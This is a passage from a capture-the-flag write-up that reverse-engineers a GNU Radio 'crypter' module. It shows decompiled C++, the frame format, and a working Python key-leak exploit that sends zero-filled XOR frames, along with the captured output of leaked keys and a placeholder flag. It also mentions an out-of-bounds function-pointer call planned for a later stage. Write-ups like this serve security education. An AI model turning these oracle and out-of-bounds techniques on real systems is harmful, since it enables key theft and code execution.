                v181 = *((_QWORD *)v180 + 4);
                v182 = (int *)*((_QWORD *)v180 + 3);
                v183 = 0;
                if ( v129 < v181 )
                  v182 = (int *)*((_QWORD *)v180 + 2);
                if ( v129 < v181 )
                  v183 = v201;
                if ( !v182 )
                  break;
                v180 = v182;
              }
              v137 = v180;
              if ( !v183 )
              {
LABEL_262:
                if ( v181 >= v129 )
                {
                  v137 = v180;
                  goto LABEL_264;
                }
                goto LABEL_278;
              }
              v137 = v233;
              if ( v233 == v180 )
                goto LABEL_278;
            }
            else
            {
              v137 = v233;
              if ( v233 == &v231 )
                goto LABEL_212;
              v180 = &v231;
            }
            v198 = std::_Rb_tree_decrement(v180, v126);
            v137 = v180;
            v159 = v208;
            v181 = *(_QWORD *)(v198 + 32);
            v180 = (int *)v198;
            goto LABEL_262;
          }
          v206 = v233;
          if ( v233 == v137 )
            goto LABEL_212;
          chosen_algo_tempa = (size_t)v159;
          v161 = std::_Rb_tree_decrement(v137, v126);
          v159 = (void *)chosen_algo_tempa;
          if ( *(_QWORD *)(v161 + 32) >= v129 )
          {
            v192 = v232;
            if ( v232 )
            {
              while ( 1 )
              {
                v193 = *((_QWORD *)v192 + 4);
                v194 = (int *)*((_QWORD *)v192 + 3);
                v126 = 0LL;
                if ( v129 < v193 )
                  v194 = (int *)*((_QWORD *)v192 + 2);
                if ( v129 < v193 )
                  v126 = v201;
                if ( !v194 )
                  break;
                v192 = v194;
              }
              v137 = v192;
              if ( !(_BYTE)v126 )
              {
LABEL_312:
                if ( v193 < v129 )
                {
                  v137 = v192;
                  v179 = 0;
                  goto LABEL_250;
                }
                goto LABEL_264;
              }
              if ( v206 == v192 )
                goto LABEL_278;
            }
            else
            {
              if ( v206 == &v231 )
              {
                v137 = &v231;
                v162 = 1LL;
                goto LABEL_213;
              }
              v192 = &v231;
            }
            v211 = v192;
            v197 = std::_Rb_tree_decrement(v192, v126);
            v159 = (void *)chosen_algo_tempa;
            v192 = v211;
            v193 = *(_QWORD *)(v197 + 32);
            v137 = (int *)v197;
            goto LABEL_312;
          }
          if ( *(_QWORD *)(v161 + 24) )
            goto LABEL_212;
          v137 = (int *)v161;
          v179 = 0;
LABEL_250:
          if ( v137 != &v231 && !v179 )
            goto LABEL_252;
LABEL_212:
          v162 = 1LL;
LABEL_213:
          v207 = (int *)v159;
          std::_Rb_tree_insert_and_rebalance(v162, v159, v137, &v231);
          v137 = v207;
          ++v235;
LABEL_214:
          *((_QWORD *)v137 + 5) = chosen_algo;
LABEL_189:
          ((void (__fastcall *)(const unsigned __int8 *, __int64, size_t))*chosen_algo)(&v54[v63 + 5], v218, nb);
          v63 += v218 + 6;
LABEL_42:
          ++v64;
          if ( v63 >= v224 )
            goto LABEL_46;
        }
        v131 = *(_QWORD *)(i + 24);
        goto LABEL_134;
      }
LABEL_46:
      v69 = (char *)&std::cout + *(_QWORD *)(std::cout - 24LL);
      v70 = (_BYTE *)*((_QWORD *)v69 + 30);
      *((_DWORD *)v69 + 6) = *((_DWORD *)v69 + 6) & 0xFFFFFFB5 | 2;
      if ( !v70 )
        std::__throw_bad_cast();
      if ( v70[56] )
      {
        v71 = v70[67];
      }
      else
      {
        std::ctype<char>::_M_widen_init(v70);
        v71 = 10;
        v143 = *(__int64 (__fastcall **)())(*(_QWORD *)v70 + 48LL);
        if ( v143 != std::ctype<char>::do_widen )
          v71 = ((__int64 (__fastcall *)(_BYTE *, __int64))v143)(v70, 10LL);
      }
      v72 = (std::ostream *)std::ostream::put((std::ostream *)&std::cout, v71);
      std::ostream::flush(v72);
      v73 = *(_QWORD *)(std::cout - 24LL);
      v74 = *(_BYTE **)((char *)&std::cout + v73 + 240);
      if ( !v74 )
        std::__throw_bad_cast();
      if ( v74[56] )
      {
        v75 = v74[67];
      }
      else
      {
        std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)&std::cout + v73 + 240));
        v75 = 10;
        v142 = *(__int64 (__fastcall **)())(*(_QWORD *)v74 + 48LL);
        if ( v142 != std::ctype<char>::do_widen )
          v75 = ((__int64 (__fastcall *)(_BYTE *, __int64))v142)(v74, 10LL);
      }
      v76 = (std::ostream *)std::ostream::put((std::ostream *)&std::cout, v75);
      std::ostream::flush(v76);
      pmt::init_u8vector((pmt *)&v230, v63, v54);
      pmt::cons(&v227, &v225, &v230);
      v77 = v230.m128i_i64[1];
      if ( v230.m128i_i64[1] )
      {
        v78 = *(_QWORD *)(v230.m128i_i64[1] + 8);
        v79 = (volatile signed __int32 *)(v230.m128i_i64[1] + 8);
        if ( v78 == 0x100000001LL )
        {
          v173 = *(_QWORD *)v230.m128i_i64[1];
          v174 = v230.m128i_i64[1];
          *(_QWORD *)(v230.m128i_i64[1] + 8) = 0LL;
          (*(void (__fastcall **)(__int64, __m128i *, __int64, volatile signed __int32 *))(v173 + 16))(
            v174,
            &v225,
            0x100000001LL,
            v79);
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v77 + 24LL))(v77);
        }
        else
        {
          if ( _libc_single_threaded )
          {
            v80 = *(_DWORD *)(v230.m128i_i64[1] + 8);
            v78 = (unsigned int)(v80 - 1);
            *(_DWORD *)(v230.m128i_i64[1] + 8) = v78;
          }
          else
          {
            v80 = _InterlockedExchangeAdd(v79, 0xFFFFFFFF);
          }
          if ( v80 == 1 )
            std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v77, &v225, v78, v79);
        }
      }
      v81 = (char *)a1 + *(_QWORD *)(*a1 - 24LL);
      v230 = _mm_load_si128(&v227);
      v82 = v81;
      if ( v227.m128i_i64[1] )
      {
        if ( _libc_single_threaded )
          ++*(_DWORD *)(v227.m128i_i64[1] + 8);
        else
          _InterlockedAdd((volatile signed __int32 *)(v227.m128i_i64[1] + 8), 1u);
      }
      strcpy((char *)&algos[2], "pdus");
      algos[0] = &algos[2];
      algos[1] = &byte_4;
      pmt::string_to_symbol(v228, algos);
      if ( algos[0] != &algos[2] )
        operator delete(algos[0], (unsigned __int64)algos[2] + 1);
      gr::basic_block::message_port_pub(v82, v228, &v230);
      v83 = (__int64)v229;
      if ( v229 )
      {
        v84 = v229[1];
        v85 = (volatile signed __int32 *)(v229 + 1);
        if ( v84 == 0x100000001LL )
        {
          v171 = *v229;
          v172 = v229;
          v229[1] = 0LL;
          (*(void (__fastcall **)(_QWORD *, char *, __int64, volatile signed __int32 *))(v171 + 16))(
            v172,
            v228,
            0x100000001LL,
            v85);
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v83 + 24LL))(v83);
        }
        else
        {
          if ( _libc_single_threaded )
          {
            v86 = *((_DWORD *)v229 + 2);
            v84 = (unsigned int)(v86 - 1);
            *((_DWORD *)v229 + 2) = v84;
          }
          else
          {
            v86 = _InterlockedExchangeAdd(v85, 0xFFFFFFFF);
          }
          if ( v86 == 1 )
            std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v83, v228, v84, v85);
        }
      }
      v87 = v230.m128i_i64[1];
      if ( v230.m128i_i64[1] )
      {
        v88 = *(_QWORD *)(v230.m128i_i64[1] + 8);
        v89 = (volatile signed __int32 *)(v230.m128i_i64[1] + 8);
        if ( v88 == 0x100000001LL )
        {
          v175 = *(_QWORD *)v230.m128i_i64[1];
          v176 = v230.m128i_i64[1];
          *(_QWORD *)(v230.m128i_i64[1] + 8) = 0LL;
          (*(void (__fastcall **)(__int64, char *, __int64, volatile signed __int32 *))(v175 + 16))(
            v176,
            v228,
            0x100000001LL,
            v89);
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v87 + 24LL))(v87);
        }
        else
        {
          if ( _libc_single_threaded )
          {
            v90 = *(_DWORD *)(v230.m128i_i64[1] + 8);
            v88 = (unsigned int)(v90 - 1);
            *(_DWORD *)(v230.m128i_i64[1] + 8) = v88;
          }
          else
          {
            v90 = _InterlockedExchangeAdd(v89, 0xFFFFFFFF);
          }
          if ( v90 == 1 )
            std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v87, v228, v88, v89);
        }
      }
      v91 = (volatile signed __int32 *)v227.m128i_i64[1];
      if ( !v227.m128i_i64[1] )
      {
LABEL_103:
        v111 = v226.m128i_i64[1];
        if ( v226.m128i_i64[1] )
        {
          v112 = *(_QWORD *)(v226.m128i_i64[1] + 8);
          v113 = (volatile signed __int32 *)(v226.m128i_i64[1] + 8);
          if ( v112 == 0x100000001LL )
          {
            v155 = *(_QWORD *)v226.m128i_i64[1];
            v156 = v226.m128i_i64[1];
            *(_QWORD *)(v226.m128i_i64[1] + 8) = 0LL;
            (*(void (__fastcall **)(__int64, char *, __int64, volatile signed __int32 *))(v155 + 16))(
              v156,
              v228,
              0x100000001LL,
              v113);
            (*(void (__fastcall **)(__int64))(*(_QWORD *)v111 + 24LL))(v111);
          }
          else
          {
            if ( _libc_single_threaded )
            {
              v114 = *(_DWORD *)(v226.m128i_i64[1] + 8);
              v112 = (unsigned int)(v114 - 1);
              *(_DWORD *)(v226.m128i_i64[1] + 8) = v112;
            }
            else
            {
              v114 = _InterlockedExchangeAdd(v113, 0xFFFFFFFF);
            }
            if ( v114 == 1 )
              std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v111, v228, v112, v113);
          }
        }
        v115 = v225.m128i_i64[1];
        if ( v225.m128i_i64[1] )
        {
          v116 = *(_QWORD *)(v225.m128i_i64[1] + 8);
          v117 = (volatile signed __int32 *)(v225.m128i_i64[1] + 8);
          if ( v116 == 0x100000001LL )
          {
            v152 = *(_QWORD *)v225.m128i_i64[1];
            v153 = v225.m128i_i64[1];
            *(_QWORD *)(v225.m128i_i64[1] + 8) = 0LL;
            (*(void (__fastcall **)(__int64, char *, __int64, volatile signed __int32 *))(v152 + 16))(
              v153,
              v228,
              0x100000001LL,
              v117);
            (*(void (__fastcall **)(__int64))(*(_QWORD *)v115 + 24LL))(v115);
            std::_Rb_tree<unsigned long,std::pair<unsigned long const,gr::mhackeroni::encrypter *>,std::_Select1st<std::pair<unsigned long const,gr::mhackeroni::encrypter *>>,std::less<unsigned long>,std::allocator<std::pair<unsigned long const,gr::mhackeroni::encrypter *>>>::_M_erase(v232);
            goto LABEL_115;
          }
          if ( _libc_single_threaded )
          {
            v118 = *(_DWORD *)(v225.m128i_i64[1] + 8);
            v116 = (unsigned int)(v118 - 1);
            *(_DWORD *)(v225.m128i_i64[1] + 8) = v116;
          }
          else
          {
            v118 = _InterlockedExchangeAdd(v117, 0xFFFFFFFF);
          }
          if ( v118 == 1 )
          {
            std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v115, v228, v116, v117);
            std::_Rb_tree<unsigned long,std::pair<unsigned long const,gr::mhackeroni::encrypter *>,std::_Select1st<std::pair<unsigned long const,gr::mhackeroni::encrypter *>>,std::less<unsigned long>,std::allocator<std::pair<unsigned long const,gr::mhackeroni::encrypter *>>>::_M_erase(v232);
            goto LABEL_115;
          }
        }
        std::_Rb_tree<unsigned long,std::pair<unsigned long const,gr::mhackeroni::encrypter *>,std::_Select1st<std::pair<unsigned long const,gr::mhackeroni::encrypter *>>,std::less<unsigned long>,std::allocator<std::pair<unsigned long const,gr::mhackeroni::encrypter *>>>::_M_erase(v232);
LABEL_115:
        operator delete(allocated_algos_list, 0x18uLL);
        return;
      }
    }
    else
    {
      std::__ostream_insert<char,std::char_traits<char>>(&std::cout, "===================", 19LL);
      v97 = *(_QWORD *)(std::cout - 24LL);
      v98 = *(_BYTE **)((char *)&std::cout + v97 + 240);
      if ( !v98 )
        std::__throw_bad_cast();
      if ( v98[56] )
      {
        v99 = v98[67];
      }
      else
      {
        std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)&std::cout + v97 + 240));
        v99 = 10;
        v122 = *(__int64 (__fastcall **)())(*(_QWORD *)v98 + 48LL);
        if ( v122 != std::ctype<char>::do_widen )
          v99 = ((__int64 (__fastcall *)(_BYTE *, __int64))v122)(v98, 10LL);
      }
      v100 = (std::ostream *)std::ostream::put((std::ostream *)&std::cout, v99);
      std::ostream::flush(v100);
      v101 = _mm_loadu_si128(a2);
      v102 = (char *)a1 + *(_QWORD *)(*a1 - 24LL);
      v230 = v101;
      v103 = v102;
      if ( v101.m128i_i64[1] )
      {
        if ( _libc_single_threaded )
          ++*(_DWORD *)(v101.m128i_i64[1] + 8);
        else
          _InterlockedAdd((volatile signed __int32 *)(v101.m128i_i64[1] + 8), 1u);
      }
      strcpy((char *)&algos[2], "pdus");
      algos[0] = &algos[2];
      algos[1] = &byte_4;
      pmt::string_to_symbol(v228, algos);
      if ( algos[0] != &algos[2] )
        operator delete(algos[0], (unsigned __int64)algos[2] + 1);
      gr::basic_block::message_port_pub(v103, v228, &v230);
      v104 = (__int64)v229;
      if ( v229 )
      {
        v105 = v229[1];
        v106 = (volatile signed __int32 *)(v229 + 1);
        if ( v105 == 0x100000001LL )
        {
          v169 = *v229;
          v170 = v229;
          v229[1] = 0LL;
          (*(void (__fastcall **)(_QWORD *, char *, __int64, volatile signed __int32 *))(v169 + 16))(
            v170,
            v228,
            0x100000001LL,
            v106);
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v104 + 24LL))(v104);
        }
        else
        {
          if ( _libc_single_threaded )
          {
            v107 = *((_DWORD *)v229 + 2);
            v105 = (unsigned int)(v107 - 1);
            *((_DWORD *)v229 + 2) = v105;
          }
          else
          {
            v107 = _InterlockedExchangeAdd(v106, 0xFFFFFFFF);
          }
          if ( v107 == 1 )
            std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v104, v228, v105, v106);
        }
      }
      v91 = (volatile signed __int32 *)v230.m128i_i64[1];
      if ( !v230.m128i_i64[1] )
        goto LABEL_103;
    }
    v108 = *((_QWORD *)v91 + 1);
    v109 = v91 + 2;
    if ( v108 == 0x100000001LL )
    {
      v154 = *(_QWORD *)v91;
      *((_QWORD *)v91 + 1) = 0LL;
      (*(void (__fastcall **)(volatile signed __int32 *, char *, __int64, volatile signed __int32 *))(v154 + 16))(
        v91,
        v228,
        0x100000001LL,
        v109);
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v91 + 24LL))(v91);
    }
    else
    {
      if ( _libc_single_threaded )
      {
        v110 = *((_DWORD *)v91 + 2);
        v108 = (unsigned int)(v110 - 1);
        *((_DWORD *)v91 + 2) = v108;
      }
      else
      {
        v110 = _InterlockedExchangeAdd(v109, 0xFFFFFFFF);
      }
      if ( v110 == 1 )
        std::_Sp_counted_base<(__gnu_cxx::_Lock_policy)2>::_M_release_last_use_cold(v91, v228, v108, v109);
    }
    goto LABEL_103;
  }
  std::__ostream_insert<char,std::char_traits<char>>(&std::cerr, "crypter: received non-PDU message", 33LL);
  v93 = *(_QWORD *)(std::cerr - 24LL);
  v94 = *(_BYTE **)((char *)&std::cerr + v93 + 240);
  if ( !v94 )
    std::__throw_bad_cast();
  if ( v94[56] )
  {
    v95 = v94[67];
  }
  else
  {
    std::ctype<char>::_M_widen_init(*(_QWORD *)((char *)&std::cerr + v93 + 240));
    v95 = 10;
    v120 = *(__int64 (__fastcall **)())(*(_QWORD *)v94 + 48LL);
    if ( v120 != std::ctype<char>::do_widen )
      v95 = ((__int64 (__fastcall *)(_BYTE *, __int64))v120)(v94, 10LL);
  }
  v96 = (std::ostream *)std::ostream::put((std::ostream *)&std::cerr, v95);
  std::ostream::flush(v96);
}
{% endhighlight %}

</details>

# Part 2 — Understanding the Crypter: Algorithm Table and Core Processing Flow

## Reversing the Crypter Library
Once inside the `mhackeroni.crypter` shared object, the first important observation is that the library builds an internal algorithm dispatch table at runtime. This table maps algorithm IDs to function pointers responsible for encrypting or decrypting payloads.
During initialization, the crypter allocates memory for this table and stores references to several algorithm implementations, such as the simple XOR-based algorithm that becomes crucial later.

![algo list](/assets/image12.png)

Later, during PDU parsing, the crypter retrieves the appropriate algorithm by indexing into this table:  

![choose algo](/assets/image19.png)
![assign](/assets/image21.png)
![call algo](/assets/image16.png)

This design becomes a vulnerability in Stage 2, where sending an out-of-bounds algo_id allows us to force the crypter to call arbitrary addresses located immediately after the table in heap memory.  

## Investigating the XOR Algorithm
Looking at the XOR function confirms that it performs a classic cyclic-key XOR:

![xor algo](/assets/image4.png)

This means that if we submit a payload consisting entirely of zero bytes, the output will equal the key repeated across the length of the payload, making this a perfect key-leak primitive.
However, understanding when this XOR function is actually applied requires diving deeper into the central routine: `handle_pdu`.

## Deep-Dive Into handle_pdu
After reversing the verbose function surrounding PDU processing, the high-level behavior becomes clear.
The function:
1. Validates the incoming PMT pair.
2. Extracts the raw byte buffer.
3. Scans the buffer byte-by-byte.
4. Interprets sections starting with `0x17` as encrypted blocks.
5. Decrypts those blocks in place using the appropriate algorithm.
6. Collapses escape sequences like `0x17 0x17` into a single literal `0x17`.
7. Re-emits the processed buffer as a new PDU.

### Frame Structure
Encrypted segments follow a strict format:

`0x17, key_id (1B), len_lo (1B), len_hi (1B), algo_id (1B), payload[len]`

Where:
- `key_id` index selects which key to use from the keys table
- `len_lo`,`len_hi` define the payload length
- `algo_id` selects the encryption algorithm
- `payload[]` is the encrypted block processed in-place

If the prefix is `0x17 0x17`, it is treated as an escaped literal byte rather than the start of a frame.

### Main scan loop over the bytes
The loop walks the input and handles escaping and encrypted blocks. There are two pointers/indexes visible in the decompiled code:
- `i` (named `v63`) – input index (how far we’ve consumed the original buffer).  
- `out` (named `v64`) – where to write the resulting bytes (de-escaping can shrink). In practice the code writes back into the same array (in-place) and advances `out` as it produces output.  

Two cases inside the loop:

#### 3a) Regular byte, not 0x17
```c
if (in[i] != 0x17) {
    *out++ = in[i++];
    continue;
}
```

#### 3b) Starts with 0x17 → look ahead

```c
marker     = in[i]            // == 0x17
key_id     = in[i+1]
len_lo     = in[i+2]
len_hi     = in[i+3]
algo_id    = in[i+4]
payload    = &in[i+5]
payloadLen = uint16_t(len_lo | (len_hi << 8))
```

Now two sub-cases:

- **Escaped 0x17:** if `key_id == 0x17` (i.e., the sequence is `0x17 0x17`), this is the escape for a literal `0x17`.
Action: write a single `0x17` to `*out`, advance `i` by `2`, advance `out` by `1`. (This collapses the doubled byte.)

- **Encrypted block:** otherwise we have a PDU crypto block.
  - It logs: "Decrypting <payloadLen> bytes\n".

It picks the algorithm from the table by algo_id:

```c
algo = algos[algo_id];  // e.g., none_algo or xor_algo
```

It looks up (or creates & caches) an "encrypter" context for this key_id.

Decrypt in place: finally it calls the selected algorithm function pointer like:

```c
algo(/*dest=*/payload, /*size=*/payloadLen, /*source/context=*/encrypter->ctx);
```

For xor_algo (provided below), that means:

```c
for each j in [0..payloadLen-1]:
    payload[j] ^= key[ j % key_len ];
```

After decryption, the loop skips over the whole encoded block in the input:

```c
i += 1 /*0x17*/ + 1 /*key*/ + 2 /*len*/ + 1 /*algo*/ + payloadLen;
```

When `i` reaches `in_len`, the loop ends.

### pseudo-code

```text
on handle_pdu(pair):
  if !is_pair(pair): log error; return;

  meta = car(pair)
  data = cdr(pair)
  if !is_u8vector(data): publish(pair) and return;

  buf, len = u8vector_elements(data)
  out = buf

  i = 0
  while (i < len):
    if (buf[i] != 0x17) {
      *out++ = buf[i++]
      continue
    }

    // 0x17 prefix
    if (i+1 < len && buf[i+1] == 0x17) {
      *out++ = 0x17
      i += 2
      continue
    }

    key_id  = buf[i+1]
    payloadLen = uint16(buf[i+2] | buf[i+3] << 8)
    algo_id = buf[i+4]
    payload = &buf[i+5]

    encr = map_by_key_id.get_or_create(key_id, algo_id, key_table[key_id])
    encr->fn(/*dest*/payload, /*size*/payloadLen, /*ctx*/encr->ctx)

    i += 5 + payloadLen  // skip whole encoded block
  end

  // (buffer modified in place)
  publish( cons(meta, make_u8vector(buf, len)) )  // out port "pdus"
```

That’s the core logic: detect framed blocks, decrypt those blocks in place using a per-key algorithm, de-escape 0x17 0x17, and re-emit the processed PDU.

# Part 3 — Leveraging the Parsing Logic: Building the Key-Leak Exploit (Stage 1)

## Understanding the Leak Primitive

With the crypter’s behavior reversed, we now have everything needed to turn it into a key oracle. The crucial observation is simple:
If the XOR algorithm is applied to a payload of all-zero bytes, the output is just the key repeated.
Why?
Because XOR with zero is an identity operation:
`0x00 ^ KeyByte = KeyByte`

Since the crypter decrypts the payload in place and then returns the modified buffer to us, all we have to do is:
Craft a valid frame.

Each frame follows the format:
`0x17 | key_id | len_lo | len_hi | algo_id | payload[len]`

To leak a key:
- `0x17` marks the start of an encrypted block
- `key_id` selects which key to fetch from /tmp/keys
- `len_lo, len_hi` define the size of the payload
- `algo_id = 0x01` selects the XOR algorithm
- `payload = b'\x00' * len` ensures the output is uninterrupted key bytes

This gives us full control over which key the crypter uses and how much of it is revealed.

## Automating the Leakage for All Keys

Because the server stores multiple keys (16 in this challenge), we can simply loop over all key IDs and build one frame for each:

```python
def leak_keys(): # leak key
    # Format: 0x17, key_id, len_lo, len_hi, algo_id, payload...
    for key_id in range(0xf):
        declared_len = 0x40
        algo_id = 0x1
        frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + declared_len * b'\x00'
        send_bytes(frame)
```

When sent to the server, every response contains the decrypted key, repeating until the declared payload length is exhausted.

You can clearly see that key 0x0C contains the placeholder flag: `space{FAKE_FLAG}`

Stage 1 complete — the entire key table (and the flag) has been leaked successfully:
```sh 
sending b'\x17\x00@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x00@\x00\x01N7hafqgUXHeFlD0cN7hafqgUXHeFlD0cN7hafqgUXHeFlD0cN7hafqgUXHeFlD0c\x00'
sending b'\x17\x01@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x01@\x00\x01MuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xUMuWOPeKQX8h7T3xU\x00'
sending b'\x17\x02@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x02@\x00\x0101enESlYdVA1CbBT01enESlYdVA1CbBT01enESlYdVA1CbBT01enESlYdVA1CbBT\x00'
sending b'\x17\x03@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x03@\x00\x01KKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiGKKDXrhdgJwqVzYiG\x00'
sending b'\x17\x04@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x04@\x00\x01dydAVgUp2oPazZtFdydAVgUp2oPazZtFdydAVgUp2oPazZtFdydAVgUp2oPazZtF\x00'
sending b'\x17\x05@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x05@\x00\x011CByrKzq9nqJVDZi1CByrKzq9nqJVDZi1CByrKzq9nqJVDZi1CByrKzq9nqJVDZi\x00'
sending b'\x17\x06@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x06@\x00\x01RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0RNXF5u9vTNwTpiJ0\x00'
sending b'\x17\x07@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x07@\x00\x01FcUoW42TXSANcH9BFcUoW42TXSANcH9BFcUoW42TXSANcH9BFcUoW42TXSANcH9B\x00'
sending b'\x17\x08@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x08@\x00\x01bRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDdbRRFBnEz3P2SJhDd\x00'
sending b'\x17\t@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\t@\x00\x017EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ7EO1aD4jb8tOd8zJ\x00'
sending b'\x17\n@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\n@\x00\x01IBas9wldIjuaKb9aIBas9wldIjuaKb9aIBas9wldIjuaKb9aIBas9wldIjuaKb9a\x00'
sending b'\x17\x0b@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x0b@\x00\x01C23f0xYARVNdBjx7C23f0xYARVNdBjx7C23f0xYARVNdBjx7C23f0xYARVNdBjx7\x00'
sending b'\x17\x0c@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x0c@\x00\x01space{FAKE_FLAG}space{FAKE_FLAG}space{FAKE_FLAG}space{FAKE_FLAG}\x00'
sending b'\x17\r@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\r@\x00\x01reZW1DbJp7K7M6whreZW1DbJp7K7M6whreZW1DbJp7K7M6whreZW1DbJp7K7M6wh\x00'
